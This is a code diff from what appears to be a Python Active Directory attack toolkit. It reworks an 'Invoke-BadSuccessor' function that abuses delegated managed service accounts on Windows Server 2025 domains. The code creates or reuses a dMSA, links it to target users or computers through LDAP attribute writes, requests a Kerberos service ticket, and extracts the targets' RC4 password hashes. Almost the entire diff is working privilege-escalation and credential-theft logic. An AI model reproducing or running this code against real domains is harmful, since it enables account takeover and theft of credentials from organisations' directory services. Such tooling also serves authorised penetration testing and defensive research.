@@ -6555,9 +6555,6 @@ displayName=New Group Policy Object
 			dmsaname = get_random_name(service_account=True)
 		if not principalallowed:
 			principalallowed = self.conn.username
-		if not targetidentity:
-			logging.warning("[Invoke-BadSuccessor] No target identity provided. Using Administrator as default")
-			targetidentity = "Administrator"
 
 		# add mirrored value to the target identity
 		# msDS_SupersededManagedServiceAccountLink = DMSA_DN
@@ -6600,55 +6597,83 @@ displayName=New Group Policy Object
 					return
 				basedn = writable_ous[0]['attributes']['distinguishedName']
 
-		#add dmsa account
-		try:
-			succeed = self.add_domaindmsa(identity=dmsaname, supersededaccount=targetidentity, principals_allowed_to_retrieve_managed_password=principalallowed, basedn=basedn)
-			if not succeed:
-				logging.error(f"[Invoke-BadSuccessor] Failed to add DMSA account {dmsaname}")
-				return
-		except Exception as e:
-			if str(e).find("invalid object class msDS-DelegatedManagedServiceAccount") >= 0:
-				logging.error(f"[Invoke-BadSuccessor] {str(e)}. Check if DC supports DMSA Account (Windows Server 2025+)")
-			else:
-				if self.args.stack_trace:
-					raise e
-				logging.error(f"[Invoke-BadSuccessor] {str(e)}")
+		# add dmsa account if not exists
+		exists = False
+		dmsa_entries = self.get_domaindmsa(identity=dmsaname, properties=['sAMAccountName', 'distinguishedName'])
+		dmsa_dn = None
+		if len(dmsa_entries) == 1:
+			dmsaname = dmsa_entries[0].get("attributes", {}).get("sAMAccountName")
+			dmsa_dn = dmsa_entries[0].get("attributes", {}).get("distinguishedName")
+			logging.warning(f"[Invoke-BadSuccessor] Using existing DMSA account {dmsaname}")
+			exists = True
+		elif len(dmsa_entries) > 1:
+			logging.error(f"[Invoke-BadSuccessor] More than one DMSA account {dmsaname} found. Use DN instead")
 			return
 
+		if not exists:
+			try:
+				succeed = self.add_domaindmsa(identity=dmsaname, principals_allowed_to_retrieve_managed_password=principalallowed, basedn=basedn)
+				if not succeed:
+					logging.error(f"[Invoke-BadSuccessor] Failed to add DMSA account {dmsaname}")
+					return
+				dmsa_dn = f"CN={dmsaname},{basedn}"
+			except Exception as e:
+				if str(e).find("invalid object class msDS-DelegatedManagedServiceAccount") >= 0:
+					logging.error(f"[Invoke-BadSuccessor] {str(e)}. Check if DC supports DMSA Account (Windows Server 2025+)")
+				else:
+					if self.args.stack_trace:
+						raise e
+					logging.error(f"[Invoke-BadSuccessor] {str(e)}")
+				return
+		
+		# modify dmsa account
+		target_users = self.get_domainuser(identity=targetidentity, properties=['objectClass', 'distinguishedName', 'sAMAccountName', 'objectClass'])
+		target_computers = self.get_domaincomputer(identity=targetidentity, properties=['objectClass', 'distinguishedName', 'sAMAccountName', 'objectClass'])
+		targets = target_users + target_computers
+		if len(targets) == 0:
+			logging.error(f"[Invoke-BadSuccessor] No targets account found")
+			return
+		
 		entries = []
-		# request service ticket for dmsaname
-		from impacket.krb5.types import Principal
-		from impacket.krb5 import constants
-		from impacket.krb5.kerberosv5 import getKerberosTGT
-		from binascii import unhexlify
+		for target in targets:
+			target_dn = target.get('attributes', {}).get('distinguishedName')
+			target_san = target.get('attributes', {}).get('sAMAccountName')
+			target_objectclass = target.get('attributes', {}).get('objectClass')
+			if 'msDS-DelegatedManagedServiceAccount' in target_objectclass:
+				continue
+			succeeded = self.ldap_session.modify(dmsa_dn, {'msDS-ManagedAccountPrecededByLink': [(ldap3.MODIFY_REPLACE, [target_dn])], 'msDS-DelegatedMSAState': [(ldap3.MODIFY_REPLACE, [DMSA_DELEGATED_MSA_STATE.MIGRATED.value])]})
+			if not succeeded:
+				logging.warning(f"[Invoke-BadSuccessor] Failed to target {target_san or target_dn}")
+			logging.debug(f"[Invoke-BadSuccessor] Successfully modified msDS-ManagedAccountPrecededByLink to {target_dn}")
+		
+			tgt = self.conn.get_TGT()
+			if not tgt:
+				userName = Principal(self.conn.username, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
+				tgt, cipher, oldSessionKey, sessionKey = getKerberosTGT(userName, self.conn.password, self.conn.get_domain(),
+																	unhexlify(self.conn.lmhash), unhexlify(self.conn.nthash), self.conn.auth_aes_key,
+																	self.conn.kdcHost)
 
-		tgt = self.conn.get_TGT()
-		if not tgt:
-			userName = Principal(self.conn.username, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
-			tgt, cipher, oldSessionKey, sessionKey = getKerberosTGT(userName, self.conn.password, self.conn.get_domain(),
-																unhexlify(self.conn.lmhash), unhexlify(self.conn.nthash), self.conn.auth_aes_key,
-																self.conn.kdcHost)
+			tgs, rcipher, oldSessionKey, sessionKey, previous_keys = MSA.request_dmsa_st(tgt, cipher, oldSessionKey, sessionKey, self.conn.kdcHost, self.conn.get_domain(), dmsaname + '$' if not dmsaname.endswith('$') else dmsaname)
+			if tgs:
+				sessionKey = oldSessionKey
 
-		tgs, rcipher, oldSessionKey, sessionKey, previous_keys = MSA.request_dmsa_st(tgt, cipher, oldSessionKey, sessionKey, self.conn.kdcHost, self.conn.get_domain(), dmsaname + '$')
-		if tgs:
-			sessionKey = oldSessionKey
-
-			for key in previous_keys:
-				try:
-					entries.append(
-						{
-							"attributes": {
-								"Domain": self.conn.get_domain(),
-								"Identity": targetidentity,
-								"RC4": key[constants.EncryptionTypes.rc4_hmac]
+				for key in previous_keys:
+					try:
+						logging.debug("[Invoke-BadSuccessor: Output] {0}\\{1}:{2}".format(self.conn.get_domain(), target_san or target_dn, key[constants.EncryptionTypes.rc4_hmac]))
+						entries.append(
+							{
+								"attributes": {
+									"Domain": self.conn.get_domain(),
+									"Identity": target_san or target_dn,
+									"RC4": key[constants.EncryptionTypes.rc4_hmac]
+								}
 							}
-						}
-					)
-					break
-				except:
-					pass
-		else:
-			logging.error(f"[Invoke-BadSuccessor] Failed to request service ticket for {dmsaname}")
+						)
+						break
+					except:
+						pass
+			else:
+				logging.error(f"[Invoke-BadSuccessor] Failed to request service ticket for {dmsaname}")
 
 		# dmsa_dn = self.get_domaindmsa(identity=dmsaname, properties=['distinguishedName'], searchbase=basedn)[0].get('attributes', {}).get('distinguishedName', None)
 		# if not dmsa_dn:
